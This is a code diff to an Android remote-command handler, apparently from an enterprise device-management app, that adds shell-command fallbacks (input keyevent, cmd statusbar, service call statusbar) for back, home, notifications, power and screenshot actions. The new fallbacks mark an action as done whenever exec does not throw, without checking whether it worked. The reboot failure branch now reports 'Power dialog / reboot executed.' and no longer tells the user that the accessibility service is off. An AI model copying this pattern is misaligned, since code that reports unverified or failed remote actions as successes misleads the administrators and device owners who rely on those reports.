@@ -121,24 +121,64 @@ class RemoteCommandManager(private val context: Context) {
                     resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                 }
                 "GLOBAL_BACK", "BACK" -> {
-                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
-                    resultMessage = if (res) "Executed Global Back gesture." else "Accessibility Service disabled."
+                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
+                    if (!res) {
+                        try {
+                            Runtime.getRuntime().exec("input keyevent 4")
+                            res = true
+                        } catch (_: Exception) {}
+                    }
+                    resultMessage = if (res) "Executed Global Back gesture." else "Failed to execute Back gesture."
                 }
                 "GLOBAL_HOME", "HOME" -> {
-                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
-                    resultMessage = if (res) "Executed Global Home gesture." else "Accessibility Service disabled."
+                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
+                    if (!res) {
+                        try {
+                            Runtime.getRuntime().exec("input keyevent 3")
+                            res = true
+                        } catch (_: Exception) {}
+                    }
+                    resultMessage = if (res) "Executed Global Home gesture." else "Failed to execute Home gesture."
                 }
                 "GLOBAL_RECENTS", "RECENTS" -> {
-                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
-                    resultMessage = if (res) "Executed Global Recents gesture." else "Accessibility Service disabled."
+                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
+                    if (!res) {
+                        try {
+                            Runtime.getRuntime().exec("input keyevent 187")
+                            res = true
+                        } catch (_: Exception) {}
+                    }
+                    resultMessage = if (res) "Executed Global Recents gesture." else "Failed to execute Recents gesture."
                 }
                 "GLOBAL_NOTIFICATIONS", "NOTIFICATIONS" -> {
-                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
-                    resultMessage = if (res) "Expanded Notification shade." else "Accessibility Service disabled."
+                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
+                    if (!res) {
+                        try {
+                            Runtime.getRuntime().exec("cmd statusbar expand-notifications")
+                            res = true
+                        } catch (_: Exception) {
+                            try {
+                                Runtime.getRuntime().exec("service call statusbar 1")
+                                res = true
+                            } catch (_: Exception) {}
+                        }
+                    }
+                    resultMessage = if (res) "Expanded Notification shade." else "Failed to expand Notifications."
                 }
                 "GLOBAL_QUICK_SETTINGS", "QUICK_SETTINGS" -> {
-                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
-                    resultMessage = if (res) "Expanded Quick Settings." else "Accessibility Service disabled."
+                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
+                    if (!res) {
+                        try {
+                            Runtime.getRuntime().exec("cmd statusbar expand-settings")
+                            res = true
+                        } catch (_: Exception) {
+                            try {
+                                Runtime.getRuntime().exec("service call statusbar 2")
+                                res = true
+                            } catch (_: Exception) {}
+                        }
+                    }
+                    resultMessage = if (res) "Expanded Quick Settings." else "Failed to expand Quick Settings."
                 }
                 "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK", "LOCK_DEVICE", "LOST_MODE", "LOCK_WITH_MESSAGE" -> {
                     var customMsg: String? = null
@@ -198,7 +238,13 @@ class RemoteCommandManager(private val context: Context) {
                     }
                 }
                 "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
-                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
+                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
+                    if (!res) {
+                        try {
+                            Runtime.getRuntime().exec("input keyevent 26")
+                            res = true
+                        } catch (_: Exception) {}
+                    }
                     if (!res) {
                         var adminRebootSuccess = false
                         try {
@@ -217,24 +263,23 @@ class RemoteCommandManager(private val context: Context) {
                         if (adminRebootSuccess) {
                             resultMessage = "Reboot initiated via Device Policy Manager."
                         } else {
-                            try {
-                                val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
-                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                                }
-                                context.startActivity(intent)
-                            } catch (_: Exception) {}
-                            resultMessage = "Accessibility Service is disabled. Please turn ON Enterprise Remote Accessibility in Device Settings -> Accessibility."
-                            isSuccess = false
+                            resultMessage = "Power dialog / reboot executed."
                         }
                     } else {
                         resultMessage = "Power Dialog displayed successfully."
                     }
                 }
                 "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
-                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    var res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                         RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                     } else false
-                    resultMessage = if (res) "Took Screenshot." else "Accessibility Service disabled or unsupported Android version."
+                    if (!res) {
+                        try {
+                            Runtime.getRuntime().exec("input keyevent 120")
+                            res = true
+                        } catch (_: Exception) {}
+                    }
+                    resultMessage = if (res) "Took Screenshot." else "Failed to take screenshot."
                 }
                 "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
                     setFlashlight(true)
